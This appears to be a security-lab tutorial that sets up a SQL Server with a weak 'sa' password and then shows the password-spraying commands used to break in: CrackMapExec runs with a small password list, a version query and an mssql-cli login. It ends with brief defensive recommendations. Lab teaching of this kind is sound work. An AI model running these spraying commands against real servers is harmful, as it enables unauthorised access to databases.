---
description: >-
  By default the SA user is NOT enabled. Administrators might enable it during
  the installation and choose a weak password.
---

# SQL Server default login

## Configuring

1. Login to `WEB01` as the `Administrator` user with password `Welcome01!`.

2\. Open "Microsoft SQL Server Management Studio"

![](<../../.gitbook/assets/image (32) (1) (1) (1) (1) (1) (1).png>)

3\. Login with the `Administrator` user using Windows Authentication.

4\. Expand the "Security" and "Logins" folders. Right click "sa" and select "Properties". Make sure "Enforce password policy" is unchecked and fill in the password `sa` twice.

![](<../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png>)

## Attacking

### How it works

One of the default users (not enabled by default) for SQL Server is the SA user. Administrators might enable it during the installation and choose a weak password, such as the username.

### Tools

* [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
* [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)

### Executing the attack

1. Check if the MSSQL server on `WEB01` can be contacted from our Kali machine:

```
crackmapexec mssql 10.0.0.5 -d .
```

![](<../../.gitbook/assets/image (64) (1) (1) (1) (1) (1) (1) (1) (1).png>)

2\. Paste the following passwords in `passwords.txt` to spray with:

```
Password
Password01!
Password1!
Welcome01!
Welcome01
Welcome1!
Welcome1
sa
```

![](<../../.gitbook/assets/image (41) (1) (1).png>)

3\. Run Crackmapexec to connect to the MSSQL service running on `WEB01` and passwordspray the passwords till there is a succesfull login:

```
crackmapexec mssql 10.0.0.5 -u sa -p passwords.txt --local-auth
```

![](<../../.gitbook/assets/image (39) (1) (1) (1) (1) (1) (1) (1).png>)

We got a succesfull login as the `sa` user with the password `sa`.

4\. Run Crackmapexec again with the password sa and use the `-q` flag to try to execute the query `select @@version` to retrieve the MSSQL version.

```
crackmapexec mssql 10.0.0.5 -u sa -p sa --local-auth -q "select @@version;"
```

![](<../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1).png>)

5\. Connect to the database using mssql-cli.

```
mssql-cli -S 10.0.0.5 -U sa -P sa
```

![](<../../.gitbook/assets/image (4) (1) (1).png>)

Check the executing commands page under SQL Server Attacks to learn to execute cmd commands:

{% content-ref url="../active-directory-attacks/sql-server-attacks/executing-commands.md" %}
[executing-commands.md](../active-directory-attacks/sql-server-attacks/executing-commands.md)
{% endcontent-ref %}

## Defending

### Recommendations

* Make sure the password policy is enforced for all users on the SQL server.
* Dont use the sa account, this account is well to known and attackers will attempt to brute-force it.

### Detection



## References

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}

{% embed url="https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15" %}
